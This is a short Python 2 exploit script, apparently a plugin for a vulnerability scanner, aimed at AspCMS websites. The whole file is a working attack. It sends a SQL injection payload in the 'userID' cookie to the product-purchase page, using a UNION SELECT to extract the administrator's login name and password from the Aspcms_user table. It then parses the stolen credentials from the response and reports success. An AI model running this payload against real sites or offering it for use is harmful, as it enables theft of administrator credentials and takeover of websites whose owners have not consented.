# -*- coding: utf-8 -*-
def exploit(url):
	url = "http://%s/productbuy/?1_2.html"%url
	poc = { 'Cookie' : 'loginstatus=1;userID=999+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,%28LoginName%29%2B%22%3D%22%2B%28Password%29,16,17,18,19,20,21,22,23,24,25,26,27,28,29+from+Aspcms_user+where+userid%3D1'}
	try:
		res= fuck.custom_post(url,'',poc)
		ok = fuck.find("value=\"(\w+=\w{16})\"",res.read())[0]
		if len(ok)>0:
			print "[*] Exploit Successful !\n[*] %s"%ok
			fuck.report(exp_ver,url+"<br>"+ok)
		else:
			print "[*] Exploit fail !"
	except Exception,e:
		print e
exploit(test_url)